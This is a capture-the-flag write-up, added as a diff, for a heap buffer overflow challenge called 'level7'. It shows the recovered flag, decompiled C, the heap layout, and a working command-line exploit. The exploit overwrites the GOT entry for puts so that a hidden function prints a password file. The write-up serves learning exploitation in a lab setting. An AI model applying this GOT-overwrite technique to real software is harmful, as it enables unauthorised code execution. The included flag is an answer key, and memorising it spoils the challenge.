@@ -1,0 +1,44 @@
+flag: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+This is a heap-based buffer overflow.
+
+int main(int ac, char **av) {
+	char **arr_a;
+	char **arr_b;
+
+	arr_a = malloc(2*sizeof(char*)); // 8
+	arr_a[0] = 1;
+	arr_a[1] = malloc(8*sizeof(char)); // 8
+
+	arr_b = malloc(2*sizeof(char*)); // 8
+	arr_b[0] = 2;
+	arr_b[1] = malloc(8*sizeof(char)); // 8
+
+	strcpy(arr_a[1], argv[1]);
+	strcpy(arr_b[1], argv[2]);
+
+	FILE *stream = fopen("/home/user/level8/.pass", "r");
+	fgets(c, 0x44, stream);
+	puts("~~");
+}
+
+The goal here is to rewrite arr_b by giving it the address in the got of puts so that we can use the second argument to give another destination to puts.
+The decompilation shows a second function not used in the code that prints c, so using this function instead of puts gives us the flag.
+
+2 mallocs are often set right next to each other in the memory. Using gdb and spamming the arguments, we can see that the program is segfaulting after 20 characters given to arr_a[1]. Here is a schema of the heap:
+
+0x00 => arr_a[0]
+0x04 => arr_a[1]
+0x08 => padding for memory alignment
+0x10 => arr_b[0]
+0x14 => arr_b[1]
+
+So arr_b[1] is 20 characters after arr_a[1].
+What we want to do is write 20 random characters, then write the adress of puts in the GOT. The second argument will only be the address of m. The program will redirect puts to m itself.
+
+objdump -R level7
+08049928 R_386_JUMP_SLOT   puts
+
+nm level7/level7 | grep 'm$'
+080484f4 T m
+
+./level7 $(python -c 'print "A"*20+"\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
